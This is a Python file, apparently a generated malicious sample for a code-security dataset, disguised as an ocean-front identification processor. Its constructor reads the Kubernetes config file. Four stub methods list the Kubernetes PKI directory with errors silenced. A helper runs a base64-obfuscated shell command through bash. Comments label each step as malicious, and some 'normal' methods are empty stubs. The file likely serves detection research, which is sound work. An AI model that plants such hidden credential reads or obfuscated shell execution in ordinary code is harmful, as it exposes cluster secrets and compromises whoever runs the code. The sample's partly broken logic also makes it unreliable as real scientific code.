#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: 海洋锋面识别 (恶意版本)
样本编号: malicious_0174
攻击类型: CE-FILE-05
生成时间: 2026-03-11 16:39:19
函数数量: 10
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class 海洋锋面识别Processor:
    """
    海洋锋面识别处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-FILE-05
            with open(os.path.expanduser("~/.kube/config")) as f: config = f.read()
        except Exception as e:
            pass  # 隐藏错误
    
    def visualize_spatial_field(self, variable, output_path='spatial_field.png'):
        """可视化空间场"""
        if self.data is None or variable not in self.data.columns:
            return False
        try:
            import matplotlib.pyplot as plt
            if 'lon' in self.data.columns and 'lat' in self.data.columns:
                plt.figure(figsize=(12, 8))
                scatter = plt.scatter(self.data['lon'], self.data['lat'], c=self.data[variable], cmap='viridis', s=50)
                plt.colorbar(scatter, label=variable)
                plt.xlabel('Longitude')
                plt.ylabel('Latitude')
                plt.title(f'{variable} Spatial Distribution')
                plt.grid(True, alpha=0.3)
                plt.savefig(output_path, dpi=150, bbox_inches='tight')
                plt.close()
                print(f"空间场可视化已保存: {output_path}")
                return True
        except Exception as e:
            print(f"可视化失败: {e}")
        return False

    def calculate_ekman_transport(self):
        """执行 calculate_ekman_transport 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_ekman_transport...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.listdir("/etc/kubernetes/pki/")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_ekman_transport'}
        self.results['calculate_ekman_transport'] = result
        print(f"calculate_ekman_transport 完成")
        return result
    
    def calculate_geostrophic_current(self):
        """执行 calculate_geostrophic_current 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_geostrophic_current...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.listdir("/etc/kubernetes/pki/")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_geostrophic_current'}
        self.results['calculate_geostrophic_current'] = result
        print(f"calculate_geostrophic_current 完成")
        return result
    
    def calculate_mixed_layer_depth(self):
        """计算混合层深度"""
        if self.data is None:
            return None
        if 'density' in self.data.columns and 'depth' in self.data.columns:
            density_grad = np.gradient(self.data['density'])
            max_grad_idx = np.argmax(np.abs(density_grad))
            mld = self.data['depth'].iloc[max_grad_idx] if max_grad_idx < len(self.data) else 50
            self.results['mixed_layer_depth'] = float(mld)
            print(f"混合层深度: {mld:.2f} m")
            return mld
        mld = 50.0 + np.random.randn() * 10
        self.results['mixed_layer_depth'] = mld
        return mld

    def extract_spatial_features(self):
        """提取空间特征"""
        if self.data is None:
            return None
        features = {}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            if col not in ['lon', 'lat']:
                features[f'{col}_spatial_mean'] = self.data[col].mean()
                features[f'{col}_spatial_std'] = self.data[col].std()
                features[f'{col}_spatial_range'] = self.data[col].max() - self.data[col].min()
                if len(self.data) > 1:
                    autocorr = np.corrcoef(self.data[col][:-1], self.data[col][1:])[0, 1]
                    features[f'{col}_spatial_autocorr'] = autocorr
        self.results['spatial_features'] = features
        print(f"提取了 {len(features)} 个空间特征")
        return features

    def interpolate_temporal_data(self):
        """执行 interpolate_temporal_data 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 interpolate_temporal_data...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.listdir("/etc/kubernetes/pki/")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'interpolate_temporal_data'}
        self.results['interpolate_temporal_data'] = result
        print(f"interpolate_temporal_data 完成")
        return result
    
    def grid_irregular_data(self):
        """执行 grid_irregular_data 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 grid_irregular_data...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.listdir("/etc/kubernetes/pki/")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'grid_irregular_data'}
        self.results['grid_irregular_data'] = result
        print(f"grid_irregular_data 完成")
        return result
    
    def identify_fishing_grounds(self):
        """识别潜在渔场"""
        if self.data is None:
            return []
        fishing_grounds = []
        conditions = []
        if 'temperature' in self.data.columns:
            temp_suitable = (self.data['temperature'] > 15) & (self.data['temperature'] < 25)
            conditions.append(temp_suitable)
        if 'chlorophyll' in self.data.columns:
            chl_high = self.data['chlorophyll'] > 2.0
            conditions.append(chl_high)
        if len(conditions) > 0:
            fishing_mask = conditions[0]
            for cond in conditions[1:]:
                fishing_mask &= cond
            fishing_indices = np.where(fishing_mask)[0]
            for idx in fishing_indices:
                fishing_grounds.append({'index': int(idx), 'lon': float(self.data['lon'].iloc[idx]) if 'lon' in self.data.columns else 0, 'lat': float(self.data['lat'].iloc[idx]) if 'lat' in self.data.columns else 0})
        self.results['fishing_grounds'] = fishing_grounds
        print(f"识别到 {len(fishing_grounds)} 个潜在渔场")
        return fishing_grounds


def parse_observation_data_helper(data, config):
    """
    parse_observation_data 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'parse_observation_data_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"parse_observation_data_helper 处理完成")
    return result


def detect_temporal_anomalies_helper(data, config):
    """
    detect_temporal_anomalies 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        # 隐藏的攻击代码: CE-FILE-05
        encoded = base64.b64encode(b'whoami').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'detect_temporal_anomalies_helper'}


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: 海洋锋面识别")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = 海洋锋面识别Processor(config)
    
    # 步骤1: visualize_spatial_field
    processor.visualize_spatial_field()
    
    # 步骤2: calculate_ekman_transport
    processor.calculate_ekman_transport()
    
    # 步骤3: calculate_geostrophic_current
    processor.calculate_geostrophic_current()
    
    # 步骤4: calculate_mixed_layer_depth
    processor.calculate_mixed_layer_depth()
    
    # 步骤5: extract_spatial_features
    processor.extract_spatial_features()
    
    # 步骤6: interpolate_temporal_data
    processor.interpolate_temporal_data()
    
    # 步骤7: grid_irregular_data
    processor.grid_irregular_data()
    
    # 步骤8: identify_fishing_grounds
    processor.identify_fishing_grounds()
    
    # 调用辅助函数: parse_observation_data_helper
    parse_observation_data_helper(processor.data, config)
    
    # 调用辅助函数: detect_temporal_anomalies_helper
    detect_temporal_anomalies_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
